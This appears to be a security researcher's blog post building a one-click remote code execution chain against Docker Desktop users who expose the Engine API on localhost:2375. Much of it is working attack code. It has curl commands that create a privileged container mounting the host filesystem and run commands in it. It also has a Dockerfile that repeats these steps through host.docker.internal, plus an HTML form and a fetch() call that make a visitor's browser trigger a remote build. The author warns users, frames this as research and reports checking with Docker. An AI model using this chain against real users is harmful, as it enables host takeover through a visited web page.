---
layout: post
title: Developing a Docker 1-Click RCE chain for fun
description: >
  In this blog post we will explore the possibility of abusing Docker's API to achieve a 1-click RCE chain.
sitemap: false
hide_last_modified: true
---

## Developing a Docker 1-Click RCE chain for fun
I'd like to preface this post by highlighting that this chain requires users to enable a specific setting in their Docker settings. Default installations are secure but if you are a regular Docker user then please make sure that you have this option disabled as otherwise you are vulnerable to RCE.

## Docker
When developing CTF challenges I often make use of Docker for its simple deployments and security guarantees. It was during some recent CTF-related endeavours that I happened upon the following configuration option for Docker which caught my eye.

![Docker API Setting](/assets/img/blog/docker_daemon_setting.png)

The configuration option is pretty simple; it will expose the "Docker API" on port 2375. Docker's official website provides a description of this API.

> The Docker Engine API is a RESTful API accessed by an HTTP client such as wget or curl, or the HTTP library which is part of most modern programming languages.

At the current time of writing the latest version is 1.47 and its endpoints are documented [here](https://docs.docker.com/reference/api/engine/version/v1.47/).

This poses the question; *why the strict warning?* Of course having access to this API allows you to create containers and execute code. The daemon also makes it possible to escalate your priveleges to the host machine. There have been many cases of attacks against exposed Docker APIs in the past but this is due to the API being made accessible to the outside world. Surely having it bound to localhost is fine?

## Abusing the API
As previously mentioned; attacks against exposed Docker APIs are pretty well defined. In fact, PayloadAllTheThings has an exploit script for exactly this case [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py).

The aforementioned exploit script fetches all container IDs and then runs a specific command inside of them. This is good for a general proof of concept but leaves a lot unexplored. *What if there's no containers?* *How do we get root access in the host context?* *What if the network configuration doesn't allow a callback?*

### Creating Containers

We can answer the first question pretty easily. The Docker API defines an endpoint to create your own containers. Using this, we can simply create our own. To escalate our privileges then we can make use of the `HostConfig` option on the endpoint, particularly the `Binds` part which allows us to create containers with read-write references to the host filesystem.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/mnt"]}}' http://localhost:2375/containers/create?name=shell
```

*To avoid mounting to WSL in Windows you can define a mount to `C:/` and access the Windows filesystem*

This will spawn a container which gives the full host filesystem in `/mnt` within the container and allows us to modify and read these files.

### Starting Containers
Once a container is created, we can start it using the `/containers/<name>/start` endpoint.

Since we passed a `?name=shell` parameter on the previous example we already defined our container name to be `shell` so we can use that.

```bash
curl -X POST http://localhost:2375/containers/shell/start
```

### Executing Commands
Above we have created a container with a mount to the host filesystem. To escalate our priveleges further we want to overwrite files on the host system.

The Docker API also provides a means of executing commands in our newly created container. Namely `/containers/shell/exec` which accepts a `Cmd` POST parameter and returns an `exec_id` and `/exec/<exec_id>/start` endpoint which allows us to run the command.

So we can use something like `jq` to parse the output of the first command, save it as an environment variable and use it in the second command to automate this.

```bash
exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://localhost:2375/containers/shell/exec | jq -r .Id)
curl -X POST "http://localhost:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
```

Since the command to execute is `mkdir /mnt/tmp/pwned` this will create a directory named `pwned` in our `/tmp` directory on the *host* filesystem.

## One-Click RCE
So at this point you should have a good idea of how we can exploit an exposed Docker API. This gave me an idea though; since this runs on `localhost:2375` is there a way for us to abuse this through a browser? That is, could we find a way of exploiting a user who visits our website and has this service running on their localhost?

### SOP
One of the main obstacles to this is Same-Origin Policy which prevents websites from interacting with endpoints of a different origin. There are some tricks to bypass this restriction; redirecting to a URL is usually not blocked. However, most of the important endpoints on the Docker API are POST.

Another common strategy is defining a HTML form with an action pointing to a remote resource and submitting it using javascript's `form.submit()` call. This would allow us to send a single POST request (along with URL parameters) to the API. The problem is that the API seems to be strictly `application/json` and the forms do not support that.

So, can we find an endpoint that will allow us to do everything we need with just a POST primitive?

### Image Builds
I tried a number of different endpoints until I eventually discovered `/build`

![build endpoint](/assets/img/blog/build_endpoint.png)

Interestingly, it accepts URL parameters. The most interesting here was `remote` which allows you to specify a remote URL for a `Dockerfile` and it will install and run the build. I built a HTML form on my website and tested this out to verify it works.

```html
<form action="http://localhost:2375/build?remote=https://<snip>/Dockerfile">
  <input id="btn" type="submit">
</form>
<script>document.getElementById("btn").click();</script>
```

Visiting the above page built my remote Dockerfile into an image.

### Abusing Image Builds
It turns out that image builds take place in their own short-lived container. Here, we can define what gets installed and run arbitrary commands. This gave me an idea for a sort of *"inception"* attack. Could we use the docker image build process to interact with the API *again* but this time using curl where we can set the `application/json` content type.

Well no... Because the build process wouldn't have access to `localhost` on the host machine. Here is where I noticed another optional parameter.

![networkmode parameter](/assets/img/blog/networkmode_option.png)

Aha! We can set the `networkmode` to `host` and this will allow us to interact with `localhost` on the host machine by referencing `host.docker.internal` host. This way we can create a Dockerfile which creates a mounted container to the host, runs commands to overwrite host files and all from them simply visiting our website which submits a form. 😱

## Putting it all Together
Below is my Dockerfile exploit.

```Dockerfile
FROM alpine:latest

RUN apk add --no-cache curl jq

RUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["C:/:/mnt"]}}' http://host.docker.internal:2375/containers/create?name=shell
RUN curl -X POST http://host.docker.internal:2375/containers/shell/start
RUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://host.docker.internal:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://host.docker.internal:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
```

Then all we need is a website to complete the POST to `http://localhost:2375/build?remote=http://<snip>/Dockerfile&networkmode=host` for it to execute. You can use the form above or simply run the follow javascript.

```javascript
fetch("http://127.0.0.1:2375/build?remote=https://<snip>/Dockerfile&networkmode=host", {method: "POST", mode: "no-cors"})
```

## Final Remarks
I think there is some more potential to expand from here. If we could build the image using GET then it'd make for a useful SSRF -> RCE gadget. This post was a bit rushed as I wanted a placeholder for my new blog so feel free to reach out to me on X ([@LooseSecurity](https://x.com/loosesecurity)) if you think there's more I could add to this.

I also wanted to point out that I did the *responsible thing* and checked with Docker Security before posting this and it is indeed an accepted risk that if you toggle this option then you are wide open to exploitation.